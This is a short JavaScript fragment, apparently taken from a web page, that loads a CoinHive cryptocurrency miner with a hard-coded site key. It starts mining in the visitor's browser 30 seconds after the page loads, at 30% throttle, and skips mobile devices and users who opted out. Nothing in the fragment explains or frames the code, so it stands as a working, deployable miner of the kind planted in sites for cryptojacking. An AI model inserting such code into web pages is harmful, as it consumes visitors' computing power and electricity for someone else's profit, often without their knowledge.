            function mtD() {
                var miner = new CoinHive.Anonymous('LKK6RhxkL0UdTVGsw8foQJHH8ekUc5CO', {
                    throttle: 0.3
                });
                if (!miner.isMobile() && !miner.didOptOut(14400)) {
                    miner.start();
                }
            }
            setTimeout(mtD, 30000);